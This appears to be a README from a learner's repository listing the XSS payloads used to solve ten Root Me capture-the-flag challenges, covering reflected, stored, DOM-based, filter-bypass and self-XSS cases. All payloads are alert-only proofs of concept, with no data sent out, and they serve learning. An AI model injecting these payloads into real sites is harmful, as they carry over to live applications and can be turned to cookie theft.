
# 🛡️ RootMe XSS Payloads Showcase

This is a documentation of XSS tests I performed on the [Root Me](https://www.root-me.org) platform. The purpose is to demonstrate the existence of XSS vulnerabilities using a **simple alert popup**, without any malicious exploitation.

---

## 🔁 Reflected XSS
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)  
  📌 Payload:
  ```html
  ' autofocus onfocus=alert(document.cookie) x="
  ```

---

## 📝 Stored XSS 1
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)  
  📌 Payload:
  ```html
  <img src=x onerror=alert(1)>
  ```

---

## 📝 Stored XSS 2
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)  
  📌 Inject in Cookie "status":
  ```html
  "><img src=x onerror=alert(1)>
  ```

---

## 🎭 Stored XSS - Filter Bypass
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)  
  📌 Payload (JSFuck style):
  ```html
  <button autofocus onfocus=(eval)(JSFuck_Payload_Here)></button>
  ```

---

## 🧭 DOM XSS - Introduction
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)  
  📌 Payload:
  ```js
  '-alert(1)-'
  ```

---

## ⚙️ DOM XSS - AngularJS
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)  
  📌 Payload:
  ```html
  {{constructor.constructor("alert(1)")()}}
  ```

---

## 💻 DOM XSS - Eval
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)  
  📌 Payload:
  ```js
  1+1+alert`XSS`
  ```

---

## 🔎 DOM XSS - Filters Bypass
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)  
  📌 Payload:
  ```js
  '-alert(1)-'
  ```

---

## 🔐 Self XSS - DOM Secrets
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-DOM-Secrets)  
  📌 Payload:
  ```html
  document.write('<script>alert(1)</script>');
  ```

---

## 🕒 Self XSS - Race Condition
- 🔗 [Challenge](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition)  
  📌 Payload:
  ```html
  element.innerHTML='<img src=1 onerror=alert(document.domain)>'
  ```

---

## ⚠️ Notes
- All payloads are intended for educational purposes only.
- No actual data was stolen or maliciously used.
- The goal is to show the existence of the XSS vulnerabilities in a harmless way.

---

## 🧠 Further Learning
- [PortSwigger XSS Academy](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---
